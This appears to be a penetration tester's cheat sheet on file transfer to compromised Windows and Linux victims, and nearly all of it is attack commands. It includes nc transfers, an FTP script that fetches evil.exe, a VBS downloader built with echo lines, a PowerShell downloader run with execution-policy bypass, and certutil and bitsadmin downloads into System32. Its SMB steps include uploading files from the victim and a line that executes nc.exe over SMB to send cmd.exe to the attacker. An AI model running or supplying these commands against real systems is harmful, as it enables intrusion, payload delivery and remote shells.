File transfer

# Do not forget to allow connection on firewalls !!

## Use nc

- on attacker machine : ```nc -nlvp 4444 < shell.php ```
- on victim machine : ```nc -nv <attacking machine> 4444 > shell.php```

---

## WINDOWS 

### TFTP : ( port 69 )

On some windows machine, there's a tftp client installed by default :
copy your file in /srv/atftp/ (arch linux) 

- ```systemctl start atftpd```

- on the targeted machine : ```
tftp -i 10.11.0.156 GET nc.exe C:/Users/Public/Downloads/nc.exe)```


### FTP : ( port 21 ) 

(file are accessible as anonymous in /srv/ftp/ in arch linux, start the service)

```echo open 10.11.0.156 21 > ftp.txt
echo anonymous>> ftp.txt
echo bin >> ftp.txt
echo GET evil.exe >> ftp.txt
echo bye >> ftp.txt
```

- Then execute : ```ftp -s:ftp.txt```

If not anonymous, modify anonymous part by :
```
echo USER <user> >> ftp.txt
echo <password> >> ftp.txt
```

### VBS

```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```


- ```cscript wget.vbs http://10.11.0.156/evil.exe exploit.exe```


### Powershell :

```
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://192.168.1.101/file.exe" >>wget.ps1
echo $file = "output-file.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```


- ```powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1```


### debug.exe

Against 32 bit windows operating systems.

There is a 64k byte size limit to the files that can be created by debug.exe

**transfer of nc :**

- Start by using upx to compress it : ```upx -9 nc.exe```

- ```wine exe2bat.exe nc.exe nc.txt```
- copy paste the nc.txt in cmd


### WITHOUT POWERSHELL :


- ```certutil.exe -urlcache -split -f "http://10.11.0.156:8000/nc.exe" c:\Windows\System32\nc.exe```

- ```bitsadmin /transfer job /download /priority high http://10.11.0.156:8000/nc.exe c:\Windows\System32\\nc.exe```

### With powershell :

Both curl, iwr or wget could be alias for Invoke-WebRequest since powershell 5.0, so :

- ```powershell wget “<url>” -outfile “ <youname>”```

- ```curl -O http://ip:port/file```

---


### SMB 

- on attacking machine :
```
smbserver SHARE $(pwd) -smb2support -user user -password password
```
- on victim machine

```
$pass = convertto-securestring 'password' -AsPlainText -Force

$cred = New-Object System.Management.Automation.PSCredential('user', $pass)

New-PSDrive -Name user -PSProvider Filesystem -Credential $cred -Root \\ip\share
```

- ```net use \\IP\SHARE```
- or ```net use \\IP\SHARE /user user password```


- Viewing available files on the SMB share : ```
dir \\10.10.14.17\SHARE```


- Downloading the nc.exe file to the victim : ```copy \\10.10.14.17\SHARE\nc.exe .```

- With SMB, files can also be uploaded from the victim to the attacker : ```copy nc2.exe \\10.10.14.17\SHARE\nc2.exe```


- Executing nc.exe over SMB on the victim. Note that the executable is not copied to the victim but executed over SMB.
```\\10.10.14.17\SHARE\nc.exe -nv 10.10.14.17 4444 -e cmd.exe``` 

- Rmove the share : ```net use * /delete /y```

### in an old cmd :

- net use /d \\\\ip\\share

- if you have the nc.exe inside, you can use it directly.